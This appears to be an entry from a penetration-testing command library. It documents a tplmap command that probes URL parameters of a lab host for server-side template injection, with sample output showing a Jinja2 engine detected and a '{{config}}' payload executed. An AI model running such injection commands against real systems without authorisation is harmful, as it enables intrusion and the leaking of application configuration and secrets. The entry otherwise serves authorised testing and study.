---
id: 72905e3b-b5b1-43ec-baed-b3c75a2ee521
name: tplmap-basic-injection
type: command
executor: bash
data: >-
  python2.7 ./tplmap.py -u
  "http://192.168.56.101:3000/ti?user=*&comment=supercomment&link"
output: null
created_at: '2023-04-06T03:56:38.834198+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - ssti
  - injection
verified: true
validated: true
---

# tplmap-basic-injection

## Command

```bash
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=*&comment=supercomment&link"
```

## Description

Injects basic SSTI payloads into URL parameters using tplmap for initial exploitation testing.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -u | Target URL with '*' for injection point | Yes |

## Examples

### Basic Usage

```bash
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=*&comment=supercomment&link"
```

## Expected Output

Engine detection and injection results:
```
[+] Jinja2 engine detected.
[*] Payload {{config}} executed successfully.
```

## Related

- [[procedures/Exploit-Server-Side-Template-Injection-with-tplmap-and-sstimap]]
- [[tools/tplmap]]
